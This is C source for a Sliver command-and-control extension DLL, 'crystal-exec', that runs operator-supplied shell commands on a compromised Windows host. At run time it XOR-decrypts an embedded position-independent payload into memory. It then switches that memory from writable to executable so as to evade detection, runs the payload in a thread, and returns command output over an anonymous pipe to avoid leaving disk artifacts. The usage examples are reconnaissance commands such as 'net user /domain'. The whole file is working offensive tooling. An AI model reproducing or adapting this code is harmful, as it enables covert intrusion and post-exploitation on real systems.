/*
 * crystal-exec.c  —  Sliver Extension DLL
 *
 * Runs a shell command through Crystal Palace evasion.
 * The crystalexec PICO is embedded at build time (crystalexec_pico.h).
 *
 * Usage:
 *   crystal-exec --cmd "whoami /all"
 *   crystal-exec --cmd "net user /domain"
 *
 * Design: ONE callback call at the very end with everything accumulated in a
 * heap buffer.  Some Sliver extension loaders only display the first callback
 * invocation; using a single call avoids that limitation.
 *
 * Output channel: anonymous pipe (no disk artifact).
 */

#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

#include "crystalexec_pico.h"   /* crystalexec_pico[], crystalexec_pico_len */

#ifndef EXPORT
#define EXPORT __declspec(dllexport)
#endif

typedef int  (*ExtCallback)(char *, int);
typedef void (*pico_entry_t)(void *);

/* ── output buffer ───────────────────────────────────────────────────────── */

#define OUT_CAP (4 * 1024 * 1024)   /* 4 MB */

typedef struct {
    char *buf;
    int   pos;
    int   cap;
} outbuf_t;

static void ob_append(outbuf_t *o, const char *s, int len)
{
    if (!o->buf || len <= 0) return;
    int room = o->cap - o->pos;
    if (len > room) len = room;
    memcpy(o->buf + o->pos, s, (size_t)len);
    o->pos += len;
}

static void ob_printf(outbuf_t *o, const char *fmt, ...)
{
    if (!o->buf) return;
    int room = o->cap - o->pos;
    if (room <= 0) return;
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(o->buf + o->pos, (size_t)room, fmt, ap);
    va_end(ap);
    if (n > 0) o->pos += (n < room ? n : room);
}

/* ── PICO thread ─────────────────────────────────────────────────────────── */

typedef struct {
    pico_entry_t entry;
    void        *args;
} pico_thread_args_t;

static DWORD WINAPI pico_thread_proc(LPVOID param)
{
    pico_thread_args_t *a = (pico_thread_args_t *)param;
    a->entry(a->args);
    return 0;
}

/* ── reader thread: drains hRead until EOF ───────────────────────────────── */

typedef struct {
    HANDLE  hRead;
    char   *buf;
    DWORD   len;
    DWORD   cap;
} reader_state_t;

static DWORD WINAPI reader_thread_proc(LPVOID param)
{
    reader_state_t *s = (reader_state_t *)param;
    DWORD n;
    while (s->len < s->cap) {
        if (!ReadFile(s->hRead, s->buf + s->len, s->cap - s->len, &n, NULL) || n == 0)
            break;
        s->len += n;
    }
    return 0;
}

/* ── extension entrypoint ────────────────────────────────────────────────── */

EXPORT int __cdecl Initialize(char *argsBuffer, uint32_t bufferSize, ExtCallback callback)
{
    outbuf_t ob = { NULL, 0, OUT_CAP };
    ob.buf = (char *)VirtualAlloc(NULL, (SIZE_T)OUT_CAP,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ob.buf) {
        if (callback) callback("error: alloc failed\n", 20);
        return 1;
    }

#define FAIL(msg) do { ob_printf(&ob, "error: " msg "\n"); goto done; } while(0)

    if (!argsBuffer || bufferSize == 0) { FAIL("no args"); }

    /* Parse "cmd=<value>" */
    int scan   = (int)bufferSize < 64 ? (int)bufferSize : 64;
    int eq_pos = -1;
    for (int i = 0; i < scan; i++) {
        if ((unsigned char)argsBuffer[i] == '=') { eq_pos = i; break; }
    }
    if (eq_pos < 1) { FAIL("invalid args"); }

    int cmd_start = eq_pos + 1;
    int cmd_len   = (int)bufferSize - cmd_start;
    if (cmd_len <= 0 || cmd_len >= 4096) { FAIL("invalid args"); }

    char cmd[4096];
    memcpy(cmd, argsBuffer + cmd_start, (size_t)cmd_len);
    cmd[cmd_len] = '\0';

    /* Anonymous pipe for output */
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { FAIL("pipe failed"); }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    /* pico_args = "<hwrite_hex>|<cmd>" */
    char pico_args[64 + 4096];
    int  pico_args_len = snprintf(pico_args, sizeof(pico_args), "%p|%s",
                                  (void *)hWrite, cmd);
    if (pico_args_len <= 0 || pico_args_len >= (int)sizeof(pico_args)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        FAIL("args overflow");
    }

    char *args_buf = (char *)VirtualAlloc(NULL, (SIZE_T)(pico_args_len + 1),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!args_buf) {
        CloseHandle(hRead); CloseHandle(hWrite);
        FAIL("alloc failed");
    }
    memcpy(args_buf, pico_args, (size_t)(pico_args_len + 1));

    void *pico_mem = VirtualAlloc(NULL, (SIZE_T)crystalexec_pico_len,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (!pico_mem) {
        VirtualFree(args_buf, 0, MEM_RELEASE);
        CloseHandle(hRead); CloseHandle(hWrite);
        FAIL("alloc failed");
    }
    /* XOR-decrypt embedded PICO into RW region */
    unsigned char *dst = (unsigned char *)pico_mem;
    for (DWORD i = 0; i < crystalexec_pico_len; i++)
        dst[i] = crystalexec_pico[i] ^ crystalexec_pico_key[i % crystalexec_pico_key_len];
    /* Flip RW → RX; no RWX mapping ever held */
    DWORD old_prot;
    if (!VirtualProtect(pico_mem, crystalexec_pico_len, PAGE_EXECUTE_READ, &old_prot)) {
        VirtualFree(pico_mem,  0, MEM_RELEASE);
        VirtualFree(args_buf, 0, MEM_RELEASE);
        CloseHandle(hRead); CloseHandle(hWrite);
        FAIL("exec failed");
    }

    DWORD   cmd_out_cap = 3 * 1024 * 1024;
    char   *cmd_out_buf = (char *)VirtualAlloc(NULL, cmd_out_cap,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
    if (!cmd_out_buf) {
        VirtualFree(pico_mem, 0, MEM_RELEASE);
        VirtualFree(args_buf, 0, MEM_RELEASE);
        CloseHandle(hRead); CloseHandle(hWrite);
        FAIL("alloc failed");
    }

    reader_state_t rs = { .hRead = hRead, .buf = cmd_out_buf,
                          .len = 0, .cap = cmd_out_cap };
    HANDLE hReader = CreateThread(NULL, 0, reader_thread_proc, &rs, 0, NULL);

    pico_thread_args_t pico_ta = {
        .entry = (pico_entry_t)pico_mem,
        .args  = args_buf,
    };
    HANDLE hPico = CreateThread(NULL, 0, pico_thread_proc, &pico_ta, 0, NULL);
    if (!hPico) {
        ob_printf(&ob, "error: exec failed (%lu)\n", GetLastError());
        CloseHandle(hWrite);
        if (hReader) { WaitForSingleObject(hReader, 5000); CloseHandle(hReader); }
        CloseHandle(hRead);
        VirtualFree(cmd_out_buf, 0, MEM_RELEASE);
        VirtualFree(args_buf, 0, MEM_RELEASE);
        VirtualFree(pico_mem, 0, MEM_RELEASE);
        goto done;
    }

    DWORD wait_res = WaitForSingleObject(hPico, 30000);
    CloseHandle(hPico);
    VirtualFree(args_buf, 0, MEM_RELEASE);

    /* Close write end → EOF on read end → reader thread finishes */
    CloseHandle(hWrite);

    if (hReader) {
        WaitForSingleObject(hReader, 10000);
        CloseHandle(hReader);
    }
    CloseHandle(hRead);

    if (rs.len > 0)
        ob_append(&ob, cmd_out_buf, (int)rs.len);
    else if (wait_res == WAIT_TIMEOUT)
        ob_printf(&ob, "timeout\n");

    VirtualFree(cmd_out_buf, 0, MEM_RELEASE);

done:
    if (ob.pos > 0 && callback)
        callback(ob.buf, ob.pos);
    VirtualFree(ob.buf, 0, MEM_RELEASE);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v)
{
    (void)h; (void)r; (void)v;
    return TRUE;
}
